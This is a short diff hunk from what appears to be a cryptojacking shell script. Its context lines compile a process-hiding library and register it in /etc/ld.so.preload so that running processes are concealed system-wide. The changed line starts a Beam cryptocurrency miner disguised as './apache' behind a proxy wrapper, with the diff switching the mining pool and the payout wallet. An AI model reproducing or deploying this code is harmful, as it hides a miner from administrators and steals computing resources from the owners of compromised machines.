@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./apache --algo beamhash --server us1-beam.flypool.org --port 3443 --ssl 1 --user 21c1199a490c4d5de1cccf0f37a21ec7cc51f1d30e4173735c368009ca1c980f886.Apache --pass x
+./graftcp/graftcp ./apache --algo beamhash --server stratum+tcp://beamv3.usa-west.nicehash.com --port 3387 --ssl 1 --user 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.Apache --pass x
